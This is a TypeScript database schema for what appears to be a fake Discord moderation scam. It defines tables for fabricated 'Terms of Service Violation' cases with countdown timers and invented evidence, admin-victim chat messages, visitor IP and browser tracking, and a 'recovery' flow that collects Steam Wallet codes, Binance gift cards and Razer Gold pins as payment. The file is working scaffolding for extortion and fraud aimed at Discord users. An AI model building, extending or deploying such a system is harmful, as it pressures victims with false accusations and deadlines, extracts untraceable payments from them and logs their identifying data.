import { sqliteTable, text, integer } from "drizzle-orm/sqlite-core";

export const cases = sqliteTable("cases", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  slug: text("slug").notNull().unique(),
  discordUserId: text("discord_user_id").notNull(),
  discordData: text("discord_data").notNull(),
  status: text("status").notNull().default("active"), // active | closed | deleted
  visits: integer("visits").notNull().default(0),
  caseNumber: text("case_number").notNull(),
  violation: text("violation").notNull().default("Terms of Service Violation"),
  reason: text("reason").notNull().default("Your account has been flagged for review."),
  evidence: text("evidence").notNull().default("[]"),
  timerSeconds: integer("timer_seconds").notNull().default(1800),
  recoveryEnabled: integer("recovery_enabled", { mode: "boolean" }).notNull().default(false),
  recoveryStatus: text("recovery_status").notNull().default("pending"), // pending | processing | completed | failed
  recoveryProgress: integer("recovery_progress").notNull().default(0), // 0-100
  recoveryFundsTotal: text("recovery_funds_total").notNull().default("0.00"),
  recoveryRefundTotal: text("recovery_refund_total").notNull().default("0.00"),
  createdAt: integer("created_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
  updatedAt: integer("updated_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
});

export const messages = sqliteTable("messages", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  caseId: integer("case_id").notNull(),
  sender: text("sender").notNull(), // "admin" | "user"
  content: text("content").notNull(),
  fileUrl: text("file_url"),
  fileName: text("file_name"),
  read: integer("read", { mode: "boolean" }).notNull().default(false),
  createdAt: integer("created_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
});

export const analytics = sqliteTable("analytics", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  caseId: integer("case_id").notNull(),
  ip: text("ip"),
  userAgent: text("user_agent"),
  device: text("device"),
  browser: text("browser"),
  referrer: text("referrer"),
  visitedAt: integer("visited_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
});

export const recoveryCodes = sqliteTable("recovery_codes", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  caseId: integer("case_id").notNull(),
  codeType: text("code_type").notNull(), // Steam Wallet Code | Binance Gift Card | Razer Gold Pins | Other
  code: text("code").notNull(),
  status: text("status").notNull().default("pending"), // pending | processing | accepted | rejected
  adminNote: text("admin_note"),
  createdAt: integer("created_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
  updatedAt: integer("updated_at", { mode: "timestamp" })
    .notNull()
    .$defaultFn(() => new Date()),
});
